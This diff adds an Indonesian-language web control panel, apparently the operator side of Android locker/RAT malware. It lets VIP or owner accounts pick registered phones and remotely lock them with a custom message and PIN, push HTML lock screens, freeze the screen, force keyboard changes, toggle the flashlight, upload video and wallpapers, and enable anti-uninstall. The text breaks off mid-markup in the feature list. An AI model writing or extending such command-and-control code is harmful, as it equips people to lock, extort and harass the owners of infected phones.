@@ -1,0 +1,1279 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Kontrol Device</title>
+  <link rel="icon" type="image/jpeg" href="https://ganga--link--ghhzdp9sv8hk.code.run/i/gy4cehptxm.jpg">
+  <style>
+    @font-face {
+      font-family: 'Evolve';
+      src: url('Evolve.ttf') format('truetype');
+    }
+    @font-face {
+      font-family: 'Eternal';
+      src: url('Eternal.ttf') format('truetype');
+    }
+
+    :root {
+      --white: #ffffff;
+      --bg: #f5f6fa;
+      --surface: #ffffff;
+      --border: #e8eaf0;
+      --text-primary: #1a1d2e;
+      --text-secondary: #6b7280;
+      --text-muted: #9ca3af;
+      --accent: #2563eb;
+      --accent-light: #eff6ff;
+      --success: #16a34a;
+      --success-light: #f0fdf4;
+      --danger: #dc2626;
+      --danger-light: #fef2f2;
+      --shadow-sm: 0 1px 3px rgba(0,0,0,0.06);
+      --shadow-md: 0 4px 16px rgba(0,0,0,0.08);
+      --shadow-lg: 0 8px 32px rgba(0,0,0,0.10);
+      --radius: 14px;
+      --radius-sm: 8px;
+      --radius-full: 999px;
+    }
+
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    button, a, input, select, textarea { -webkit-tap-highlight-color: transparent; outline: none; }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(8px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    @keyframes popIn {
+      from { opacity: 0; transform: scale(0.90); }
+      to { opacity: 1; transform: scale(1); }
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.5; }
+    }
+
+    body {
+      font-family: 'Evolve', sans-serif;
+      background: var(--bg);
+      color: var(--text-primary);
+      min-height: 100vh;
+      display: flex;
+      align-items: flex-start;
+      justify-content: center;
+      padding: 24px 24px 100px;
+    }
+
+    .wrap {
+      width: 100%;
+      max-width: 420px;
+      animation: fadeIn 0.22s ease;
+    }
+
+    .back-btn {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      font-family: 'Eternal', sans-serif;
+      font-size: 13px;
+      color: var(--text-secondary);
+      background: none;
+      border: none;
+      cursor: pointer;
+      padding: 0;
+      margin-bottom: 20px;
+      transition: color 0.15s;
+    }
+    .back-btn:hover { color: var(--accent); }
+
+    .page-header {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 20px;
+    }
+
+    .page-header-icon {
+      width: 44px;
+      height: 44px;
+      border-radius: 12px;
+      background: linear-gradient(135deg, #ef4444, #dc2626);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
+      flex-shrink: 0;
+      box-shadow: 0 4px 12px rgba(220,38,38,0.3);
+    }
+
+    .page-header-text { flex: 1; }
+
+    .page-header-title {
+      font-family: 'Eternal', sans-serif;
+      font-size: 20px;
+      font-weight: 700;
+      color: var(--text-primary);
+    }
+
+    .page-header-sub {
+      font-size: 12px;
+      color: var(--text-muted);
+      margin-top: 2px;
+    }
+
+    .card {
+      background: var(--surface);
+      border-radius: var(--radius);
+      border: 1px solid var(--border);
+      box-shadow: var(--shadow-md);
+      padding: 20px;
+      margin-bottom: 14px;
+    }
+
+    .section-label {
+      font-size: 11px;
+      font-weight: 700;
+      color: var(--text-muted);
+      letter-spacing: 0.06em;
+      text-transform: uppercase;
+      margin-bottom: 12px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .device-list {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+
+    .device-card {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 14px 16px;
+      border-radius: var(--radius-sm);
+      border: 1.5px solid var(--border);
+      background: var(--bg);
+      cursor: pointer;
+      transition: border-color 0.15s, background 0.15s, box-shadow 0.15s;
+    }
+
+    .device-card:hover {
+      border-color: var(--danger);
+      background: var(--danger-light);
+      box-shadow: 0 2px 8px rgba(220,38,38,0.08);
+    }
+
+    .device-card.selected {
+      border-color: var(--danger);
+      background: var(--danger-light);
+    }
+
+    .device-status-dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      flex-shrink: 0;
+    }
+
+    .device-status-dot.online { background: var(--success); }
+    .device-status-dot.offline { background: var(--text-muted); }
+
+    .device-card-info { flex: 1; min-width: 0; }
+
+    .device-card-name {
+      font-family: 'Eternal', sans-serif;
+      font-size: 14px;
+      font-weight: 600;
+      color: var(--text-primary);
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+
+    .device-card-meta {
+      font-size: 11px;
+      color: var(--text-muted);
+      margin-top: 2px;
+    }
+
+    .device-card-arrow {
+      color: var(--text-muted);
+      flex-shrink: 0;
+    }
+
+    .device-empty {
+      text-align: center;
+      padding: 32px 20px;
+      color: var(--text-muted);
+      font-size: 13px;
+    }
+
+    .device-empty svg {
+      opacity: 0.3;
+      margin-bottom: 10px;
+      display: block;
+      margin-left: auto;
+      margin-right: auto;
+    }
+
+    .loading-wrap {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 32px;
+    }
+
+    .spinner {
+      width: 28px;
+      height: 28px;
+      border: 2.5px solid var(--border);
+      border-top-color: var(--danger);
+      border-radius: 50%;
+      animation: spin 0.7s linear infinite;
+    }
+
+    .device-detail-card {
+      background: var(--surface);
+      border-radius: var(--radius);
+      border: 1px solid var(--border);
+      box-shadow: var(--shadow-md);
+      margin-bottom: 14px;
+      overflow: hidden;
+    }
+
+    .device-detail-header {
+      background: linear-gradient(135deg, #ef4444, #dc2626, #b91c1c);
+      padding: 18px 20px;
+      display: flex;
+      align-items: center;
+      gap: 14px;
+    }
+
+    .device-detail-icon {
+      width: 48px;
+      height: 48px;
+      border-radius: 12px;
+      background: rgba(255,255,255,0.18);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
+      flex-shrink: 0;
+    }
+
+    .device-detail-info { flex: 1; }
+
+    .device-detail-name {
+      font-family: 'Eternal', sans-serif;
+      font-size: 17px;
+      font-weight: 700;
+      color: #fff;
+      letter-spacing: 0.01em;
+    }
+
+    .device-detail-model {
+      font-size: 11.5px;
+      color: rgba(255,255,255,0.80);
+      margin-top: 3px;
+    }
+
+    .device-detail-status {
+      display: inline-flex;
+      align-items: center;
+      gap: 5px;
+      padding: 4px 10px;
+      border-radius: var(--radius-full);
+      font-size: 11px;
+      font-weight: 700;
+    }
+
+    .device-detail-status.online {
+      background: rgba(22,163,74,0.25);
+      color: #bbf7d0;
+    }
+
+    .device-detail-status.offline {
+      background: rgba(0,0,0,0.20);
+      color: rgba(255,255,255,0.65);
+    }
+
+    .device-detail-body {
+      padding: 18px 20px;
+    }
+
+    .features-grid {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+    }
+
+    .feature-row {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 12px 14px;
+      border-radius: var(--radius-sm);
+      background: var(--bg);
+      border: 1.5px solid var(--border);
+    }
+
+    .feature-row-icon {
+      width: 36px;
+      height: 36px;
+      border-radius: 9px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+    }
+
+    .feature-row-icon.red { background: rgba(220,38,38,0.12); color: #dc2626; }
+    .feature-row-icon.blue { background: rgba(37,99,235,0.12); color: #2563eb; }
+    .feature-row-icon.green { background: rgba(22,163,74,0.12); color: #16a34a; }
+    .feature-row-icon.amber { background: rgba(217,119,6,0.12); color: #d97706; }
+    .feature-row-icon.purple { background: rgba(124,58,237,0.12); color: #7c3aed; }
+    .feature-row-icon.pink { background: rgba(236,72,153,0.12); color: #ec4899; }
+
+    .feature-row-text { flex: 1; }
+
+    .feature-row-title {
+      font-family: 'Eternal', sans-serif;
+      font-size: 13px;
+      font-weight: 600;
+      color: var(--text-primary);
+    }
+
+    .feature-row-desc {
+      font-size: 11px;
+      color: var(--text-muted);
+      margin-top: 2px;
+    }
+
+    .toggle-wrap {
+      flex-shrink: 0;
+      position: relative;
+      width: 44px;
+      height: 24px;
+    }
+
+    .toggle-wrap input {
+      opacity: 0;
+      width: 0;
+      height: 0;
+      position: absolute;
+    }
+
+    .toggle-slider {
+      position: absolute;
+      inset: 0;
+      background: var(--border);
+      border-radius: var(--radius-full);
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+
+    .toggle-slider::before {
+      content: '';
+      position: absolute;
+      width: 18px;
+      height: 18px;
+      border-radius: 50%;
+      background: #fff;
+      top: 3px;
+      left: 3px;
+      transition: transform 0.2s;
+      box-shadow: 0 1px 4px rgba(0,0,0,0.18);
+    }
+
+    .toggle-wrap input:checked + .toggle-slider {
+      background: var(--danger);
+    }
+
+    .toggle-wrap input:checked + .toggle-slider::before {
+      transform: translateX(20px);
+    }
+
+    .toggle-wrap input:disabled + .toggle-slider {
+      opacity: 0.5;
+      cursor: not-allowed;
+    }
+
+    .upload-row {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 12px 14px;
+      border-radius: var(--radius-sm);
+      background: var(--bg);
+      border: 1.5px solid var(--border);
+    }
+
+    .upload-btn {
+      font-family: 'Evolve', sans-serif;
+      flex-shrink: 0;
+      padding: 8px 14px;
+      border-radius: var(--radius-sm);
+      border: none;
+      font-size: 12px;
+      font-weight: 600;
+      cursor: pointer;
+      background: var(--danger);
+      color: #fff;
+      transition: opacity 0.15s;
+    }
+
+    .upload-btn:hover { opacity: 0.85; }
+
+    .upload-btn:disabled {
+      opacity: 0.45;
+      cursor: not-allowed;
+    }
+
+    .overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.18);
+      z-index: 100;
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
+    }
+    .overlay.show { display: flex; animation: fadeIn 0.18s ease; }
+
+    .notif-card {
+      background: var(--white);
+      border-radius: var(--radius);
+      border: 1px solid var(--border);
+      box-shadow: var(--shadow-lg);
+      padding: 28px 24px 24px;
+      width: 100%;
+      max-width: 340px;
+      text-align: center;
+      animation: popIn 0.2s cubic-bezier(0.34,1.56,0.64,1);
+    }
+
+    .notif-icon-wrap {
+      width: 56px;
+      height: 56px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 16px;
+      font-size: 26px;
+      color: var(--white);
+    }
+
+    .notif-icon-wrap.success { background: var(--success); }
+    .notif-icon-wrap.error { background: var(--danger); }
+    .notif-icon-wrap.info { background: var(--accent); }
+
+    .notif-title {
+      font-family: 'Eternal', sans-serif;
+      font-size: 16px;
+      font-weight: 700;
+      color: var(--text-primary);
+      margin-bottom: 8px;
+    }
+
+    .notif-message {
+      font-size: 13px;
+      color: var(--text-secondary);
+      line-height: 1.6;
+      margin-bottom: 22px;
+    }
+
+    .notif-btn {
+      font-family: 'Evolve', sans-serif;
+      width: 100%;
+      padding: 11px 18px;
+      border-radius: var(--radius-sm);
+      border: none;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      color: var(--white);
+      transition: opacity 0.15s;
+    }
+    .notif-btn:hover { opacity: 0.88; }
+    .notif-btn.success { background: var(--success); }
+    .notif-btn.error { background: var(--danger); }
+    .notif-btn.info { background: var(--accent); }
+
+    .input-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.25);
+      z-index: 110;
+      align-items: flex-end;
+      justify-content: center;
+      padding: 0;
+    }
+    .input-overlay.show { display: flex; animation: fadeIn 0.18s ease; }
+
+    .input-sheet {
+      background: var(--white);
+      border-radius: var(--radius) var(--radius) 0 0;
+      border: 1px solid var(--border);
+      box-shadow: var(--shadow-lg);
+      padding: 24px 20px 32px;
+      width: 100%;
+      max-width: 420px;
+      animation: popIn 0.22s cubic-bezier(0.34,1.56,0.64,1);
+    }
+
+    .input-sheet-title {
+      font-family: 'Eternal', sans-serif;
+      font-size: 16px;
+      font-weight: 700;
+      color: var(--text-primary);
+      margin-bottom: 6px;
+    }
+
+    .input-sheet-desc {
+      font-size: 12px;
+      color: var(--text-muted);
+      margin-bottom: 18px;
+      line-height: 1.5;
+    }
+
+    .input-field {
+      width: 100%;
+      padding: 11px 14px;
+      border-radius: var(--radius-sm);
+      border: 1.5px solid var(--border);
+      background: var(--bg);
+      color: var(--text-primary);
+      font-family: 'Evolve', sans-serif;
+      font-size: 14px;
+      outline: none;
+      transition: border-color 0.15s;
+      margin-bottom: 10px;
+    }
+
+    .input-field:focus {
+      border-color: var(--danger);
+      background: var(--white);
+    }
+
+    .input-field::placeholder { color: var(--text-muted); }
+
+    .textarea-field {
+      width: 100%;
+      padding: 11px 14px;
+      border-radius: var(--radius-sm);
+      border: 1.5px solid var(--border);
+      background: var(--bg);
+      color: var(--text-primary);
+      font-family: 'Evolve', sans-serif;
+      font-size: 13px;
+      outline: none;
+      transition: border-color 0.15s;
+      margin-bottom: 10px;
+      resize: vertical;
+      min-height: 100px;
+    }
+
+    .textarea-field:focus {
+      border-color: var(--danger);
+      background: var(--white);
+    }
+
+    .input-sheet-actions {
+      display: flex;
+      gap: 10px;
+      margin-top: 4px;
+    }
+
+    .btn {
+      font-family: 'Evolve', sans-serif;
+      flex: 1;
+      padding: 11px 18px;
+      border-radius: var(--radius-sm);
+      border: none;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: opacity 0.15s;
+    }
+
+    .btn-danger { background: var(--danger); color: #fff; }
+    .btn-ghost {
+      background: var(--bg);
+      color: var(--text-secondary);
+      border: 1.5px solid var(--border);
+    }
+    .btn:hover { opacity: 0.88; }
+
+    .refresh-btn {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      font-family: 'Evolve', sans-serif;
+      font-size: 12px;
+      font-weight: 600;
+      color: var(--text-secondary);
+      background: var(--bg);
+      border: 1.5px solid var(--border);
+      border-radius: var(--radius-sm);
+      padding: 7px 12px;
+      cursor: pointer;
+      transition: background 0.15s, color 0.15s;
+      flex-shrink: 0;
+    }
+
+    .refresh-btn:hover { background: var(--border); color: var(--text-primary); }
+
+    .section-header-row {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 12px;
+    }
+
+    .delete-device-btn {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      font-family: 'Evolve', sans-serif;
+      font-size: 12px;
+      font-weight: 600;
+      color: var(--danger);
+      background: var(--danger-light);
+      border: 1.5px solid #fecaca;
+      border-radius: var(--radius-sm);
+      padding: 7px 12px;
+      cursor: pointer;
+      transition: opacity 0.15s;
+    }
+
+    .delete-device-btn:hover { opacity: 0.78; }
+  </style>
+</head>
+<body>
+<div class="wrap" id="app">
+  <div class="loading-wrap"><div class="spinner"></div></div>
+</div>
+
+<div class="overlay" id="notifOverlay">
+  <div class="notif-card">
+    <div class="notif-icon-wrap" id="notifIcon">
+      <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+        <polyline points="20 6 9 17 4 12"/>
+      </svg>
+    </div>
+    <div class="notif-title" id="notifTitle">Berhasil</div>
+    <div class="notif-message" id="notifMessage">Aksi berhasil dikirim ke device.</div>
+    <button class="notif-btn" id="notifBtn" onclick="closeNotif()">Oke</button>
+  </div>
+</div>
+
+<div class="input-overlay" id="lockOverlay">
+  <div class="input-sheet">
+    <div class="input-sheet-title">🔒 Lock Device</div>
+    <div class="input-sheet-desc">Masukkan pesan lock dan PIN 4 angka untuk mengunci device.</div>
+    <input class="input-field" id="lockTextInput" placeholder="Pesan yang tampil di layar..." />
+    <input class="input-field" id="lockPinInput" placeholder="PIN 4 angka (contoh: 1234)" maxlength="4" inputmode="numeric" />
+    <div class="input-sheet-actions">
+      <button class="btn btn-ghost" onclick="closeInputSheet('lockOverlay')">Batal</button>
+      <button class="btn btn-danger" onclick="submitLock()">Kirim Lock</button>
+    </div>
+  </div>
+</div>
+
+<div class="input-overlay" id="teksLayarOverlay">
+  <div class="input-sheet">
+    <div class="input-sheet-title">📝 Teks Layar</div>
+    <div class="input-sheet-desc">Masukkan teks yang akan ditampilkan di layar device.</div>
+    <textarea class="textarea-field" id="teksLayarInput" placeholder="Teks yang ingin ditampilkan..."></textarea>
+    <div class="input-sheet-actions">
+      <button class="btn btn-ghost" onclick="closeInputSheet('teksLayarOverlay')">Batal</button>
+      <button class="btn btn-danger" onclick="submitTeksLayar()">Kirim Teks</button>
+    </div>
+  </div>
+</div>
+
+<div class="input-overlay" id="lockHtmlOverlay">
+  <div class="input-sheet">
+    <div class="input-sheet-title">🖥️ Lock HTML</div>
+    <div class="input-sheet-desc">Masukkan kode HTML yang akan ditampilkan sebagai lock screen.</div>
+    <textarea class="textarea-field" id="lockHtmlInput" placeholder="&lt;html&gt;...kode HTML...&lt;/html&gt;" style="min-height:140px;font-family:monospace;font-size:12px;"></textarea>
+    <div class="input-sheet-actions">
+      <button class="btn btn-ghost" onclick="closeInputSheet('lockHtmlOverlay')">Batal</button>
+      <button class="btn btn-danger" onclick="submitLockHtml()">Kirim HTML</button>
+    </div>
+  </div>
+</div>
+
+<input type="file" id="videoFileInput" accept="video/*" style="display:none" onchange="handleVideoUpload(this)" />
+<input type="file" id="wallpaperFileInput" accept="image/*" style="display:none" onchange="handleWallpaperUpload(this)" />
+
+<script>
+  const BASE = ''
+  let token = null
+  let userRole = null
+  let selectedDevice = null
+  let deviceList = []
+  let pendingDeviceId = null
+  let refreshInterval = null
+
+  function getToken() {
+    try { return localStorage.getItem('token') } catch { return null }
+  }
+
+  function getRole() {
+    try { return localStorage.getItem('role') } catch { return null }
+  }
+
+  async function init() {
+    token = getToken()
+    userRole = getRole()
+    if (!token) {
+      window.location.href = '/'
+      return
+    }
+    if (userRole !== 'vip' && userRole !== 'owner') {
+      renderAccessDenied()
+      return
+    }
+    try {
+      const r = await fetch(`${BASE}/api/session/verify?token=${token}`)
+      const d = await r.json()
+      if (!d.ok) { window.location.href = '/'; return }
+      userRole = d.role
+      if (userRole !== 'vip' && userRole !== 'owner') {
+        renderAccessDenied()
+        return
+      }
+    } catch {
+      window.location.href = '/'
+      return
+    }
+    renderDeviceList()
+    loadDevices()
+  }
+
+  function renderAccessDenied() {
+    document.getElementById('app').innerHTML = `
+      <button class="back-btn" onclick="window.location.href='/'">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="15 18 9 12 15 6"/></svg>
+        Kembali
+      </button>
+      <div class="card" style="text-align:center;padding:40px 20px;">
+        <div style="font-size:40px;margin-bottom:16px;">🚫</div>
+        <div style="font-family:'Eternal',sans-serif;font-size:17px;font-weight:700;margin-bottom:8px;">Akses Ditolak</div>
+        <div style="font-size:13px;color:var(--text-muted);">Fitur ini hanya untuk member VIP dan Owner.</div>
+      </div>
+    `
+  }
+
+  function renderDeviceList() {
+    document.getElementById('app').innerHTML = `
+      <button class="back-btn" onclick="window.location.href='/'">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="15 18 9 12 15 6"/></svg>
+        Kembali
+      </button>
+      <div class="page-header">
+        <div class="page-header-icon">
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg>
+        </div>
+        <div class="page-header-text">
+          <div class="page-header-title">Kontrol Device</div>
+          <div class="page-header-sub">Kelola dan kontrol device terdaftar</div>
+        </div>
+      </div>
+      <div class="card">
+        <div class="section-header-row">
+          <div class="section-label">
+            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="5" y="2" width="14" height="20" rx="2"/></svg>
+            Device Kamu
+          </div>
+          <button class="refresh-btn" onclick="loadDevices()">
+            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/></svg>
+            Refresh
+          </button>
+        </div>
+        <div class="device-list" id="deviceList">
+          <div class="loading-wrap"><div class="spinner"></div></div>
+        </div>
+      </div>
+    `
+  }
+
+  async function loadDevices() {
+    const list = document.getElementById('deviceList')
+    if (list) list.innerHTML = `<div class="loading-wrap"><div class="spinner"></div></div>`
+    try {
+      const r = await fetch(`${BASE}/api/devices`, {
+        headers: { 'x-token': token }
+      })
+      deviceList = await r.json()
+      renderDevices()
+    } catch {
+      if (list) list.innerHTML = `<div class="device-empty"><svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="5" y="2" width="14" height="20" rx="2"/></svg><p>Gagal memuat device.</p></div>`
+    }
+  }
+
+  function renderDevices() {
+    const list = document.getElementById('deviceList')
+    if (!list) return
+    if (!deviceList.length) {
+      list.innerHTML = `<div class="device-empty"><svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="5" y="2" width="14" height="20" rx="2"/></svg><p>Belum ada device terdaftar.</p></div>`
+      return
+    }
+    list.innerHTML = deviceList.map(d => `
+      <div class="device-card" onclick="openDevice('${d.id}')">
+        <div class="device-status-dot ${d.status}"></div>
+        <div class="device-card-info">
+          <div class="device-card-name">${escHtml(d.name)}</div>
+          <div class="device-card-meta">${escHtml(d.model || 'Unknown Model')} · ${d.status === 'online' ? '🟢 Online' : '⚫ Offline'}</div>
+        </div>
+        <div class="device-card-arrow">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="9 18 15 12 9 6"/></svg>
+        </div>
+      </div>
+    `).join('')
+  }
+
+  function openDevice(id) {
+    const device = deviceList.find(d => d.id === id)
+    if (!device) return
+    selectedDevice = device
+    renderDeviceDetail(device)
+    if (refreshInterval) clearInterval(refreshInterval)
+    refreshInterval = setInterval(() => refreshDeviceStatus(id), 5000)
+  }
+
+  async function refreshDeviceStatus(id) {
+    try {
+      const r = await fetch(`${BASE}/api/devices`, { headers: { 'x-token': token } })
+      const list = await r.json()
+      const d = list.find(x => x.id === id)
+      if (d) {
+        selectedDevice = d
+        const statusEl = document.getElementById('deviceStatusBadge')
+        const dotEl = document.getElementById('deviceStatusDot')
+        if (statusEl) {
+          statusEl.className = `device-detail-status ${d.status}`
+          statusEl.innerHTML = d.status === 'online'
+            ? `<span style="width:7px;height:7px;border-radius:50%;background:#bbf7d0;display:inline-block;"></span> Online`
+            : `<span style="width:7px;height:7px;border-radius:50%;background:rgba(255,255,255,0.4);display:inline-block;"></span> Offline`
+        }
+        updateToggleStates(d.features || {})
+      }
+    } catch {}
+  }
+
+  function updateToggleStates(features) {
+    const map = {
+      'toggle-lock': features.lock,
+      'toggle-flashlight': features.flashlight,
+      'toggle-keyboard': features.keyboardCycle,
+      'toggle-tekslayar': features.teksLayar,
+      'toggle-lcdefek': features.lcdEfek,
+      'toggle-antiuninstall': features.antiUninstall,
+      'toggle-freezelayar': features.freezeLayar,
+      'toggle-ambarus': features.ambarus
+    }
+    for (const [id, val] of Object.entries(map)) {
+      const el = document.getElementById(id)
+      if (el) el.checked = !!val
+    }
+  }
+
+  function renderDeviceDetail(device) {
+    const f = device.features || {}
+    document.getElementById('app').innerHTML = `
+      <button class="back-btn" onclick="goBackToList()">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="15 18 9 12 15 6"/></svg>
+        Semua Device
+      </button>
+
+      <div class="device-detail-card">
+        <div class="device-detail-header">
+          <div class="device-detail-icon">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg>
+          </div>
+          <div class="device-detail-info">
+            <div class="device-detail-name">${escHtml(device.name)}</div>
+            <div class="device-detail-model">${escHtml(device.model || 'Unknown Model')}</div>
+          </div>
+          <div class="device-detail-status ${device.status}" id="deviceStatusBadge">
+            <span style="width:7px;height:7px;border-radius:50%;background:${device.status === 'online' ? '#bbf7d0' : 'rgba(255,255,255,0.4)'};display:inline-block;"></span>
+            ${device.status === 'online' ? 'Online' : 'Offline'}
+          </div>
+        </div>
+        <div class="device-detail-body">
+          <div class="section-label" style="margin-bottom:14px;">
+            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="3"/><path d="M19.07 4.93a10 10 0 0 1 0 14.14M4.93 4.93a10 10 0 0 0 0 14.14"/></svg>
+            Kontrol Fitur
+          </div>
+          <div class="features-grid">
+
+            <div class="feature-row">
+              <div class="feature-row-icon red">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+              </div>
+              <div class="feature-row-text">
+                <div class="feature-row-title">Lock Device</div>
+                <div class="feature-row-desc">Kunci layar device dengan pesan & PIN</div>
+              </div>
+              <label class="toggle-wrap">
+                <input type="checkbox" id="toggle-lock" ${f.lock ? 'checked' : ''} onchange="handleToggle(this, 'lock', 'lock_off_notif', true)" />
+                <span class="toggle-slider"></span>
+              </label>
+            </div>
+
+            <div class="feature-row">
+              <div class="feature-row-icon amber">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 2v2"/><path d="M12 20v2"/><path d="m4.93 4.93 1.41 1.41"/><path d="m17.66 17.66 1.41 1.41"/><path d="M2 12h2"/><path d="M20 12h2"/><path d="m6.34 17.66-1.41 1.41"/><path d="m19.07 4.93-1.41 1.41"/><circle cx="12" cy="12" r="4"/></svg>
+              </div>
+              <div class="feature-row-text">
+                <div class="feature-row-title">Senter</div>
+                <div class="feature-row-desc">Nyalakan atau matikan senter device</div>
+              </div>
+              <label class="toggle-wrap">
+                <input type="checkbox" id="toggle-flashlight" ${f.flashlight ? 'checked' : ''} onchange="handleToggle(this, 'flashlight', 'flashlight_off')" />
+                <span class="toggle-slider"></span>
+              </label>
+            </div>
+
+            <div class="feature-row">
+              <div class="feature-row-icon blue">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="2" y="6" width="20" height="12" rx="2"/><path d="M6 10h.01M10 10h.01M14 10h.01M18 10h.01M6 14h12"/></svg>
+              </div>
+              <div class="feature-row-text">
+                <div class="feature-row-title">Keyboard Cycle</div>
+                <div class="feature-row-desc">Ubah keyboard device secara paksa</div>
+              </div>
+              <label class="toggle-wrap">
+                <input type="checkbox" id="toggle-keyboard" ${f.keyboardCycle ? 'checked' : ''} onchange="handleToggle(this, 'keyboard_cycle', 'keyboard_cycle_off')" />
+                <span class="toggle-slider"></span>
+              </label>
+            </div>
+
+            <div class="feature-row">
+              <div class="feature-row-icon purple">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M4 7V4h16v3"/><path d="M9 20h6"/><path d="M12 4v16"/></svg>
+              </div>
+              <div class="feature-row-text">
+                <div class="feature-row-title">Teks Layar</div>
+                <div class="feature-row-desc">Tampilkan teks di layar device</div>
+              </div>
+              <label class="toggle-wrap">
+                <input type="checkbox" id="toggle-tekslayar" ${f.teksLayar ? 'checked' : ''} onchange="handleToggle(this, 'tekslayar', 'tekslayar_off', false, true)" />
+                <span class="toggle-slider"></span>
+              </label>
+            </div>
+
+            <div class="feature-row">
+              <div class="feature-row-icon pink">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
+              </div>
+              <div class="feature-row-text">
+                <div class="feature-row-title">LCD Efek</div>
+                <div class="feature-row-desc">Aktifkan efek LCD pada layar device</div>
+              </div>
+              <label class="toggle-wrap">
+                <input type="checkbox" id="toggle-lcdefek" ${f.lcdEfek ? 'checked' : ''} onchange="handleToggle(this, 'lcdefek', 'lcdefek_off')" />
+                <span class="toggle-slider"></span>
+              </label>
+            </div>
+
+            <div class="feature-row">
+              <div class="feature-row-icon green">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+              </div>
+              <div class="feature-row-text">
+                <div class="feature-row-title">Anti Uninstall</div>
+                <div class="feature-row-desc">Cegah aplikasi di-uninstall</div>
+              </div>
+              <label class="toggle-wrap">
+                <input type="checkbox" id="toggle-antiuninstall" ${f.antiUninstall !== false ? 'checked' : ''} onchange="handleToggle(this, 'antiuninstall', 'antiuninstall_off')" />
+                <span class="toggle-slider"></span>
+              </label>
+            </div>
+
+            <div class="feature-row">
+              <div class="feature-row-icon red">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="3" y="3" width="18" height="18" rx="2"/><line x1="9" y1="9" x2="15" y2="15"/><line x1="15" y1="9" x2="9" y2="15"/></svg>
+              </div>
+              <div class="feature-row-text">
+                <div class="feature-row-title">Freeze Layar</div>
+                <div class="feature-row-desc">Bekukan layar device</div>
+              </div>
+              <label class="toggle-wrap">
+                <input type="checkbox" id="toggle-freezelayar" ${f.freezeLayar ? 'checked' : ''} onchange="handleToggle(this, 'freezelayar', 'freezelayar_off')" />
+                <span class="toggle-slider"></span>
+              </label>
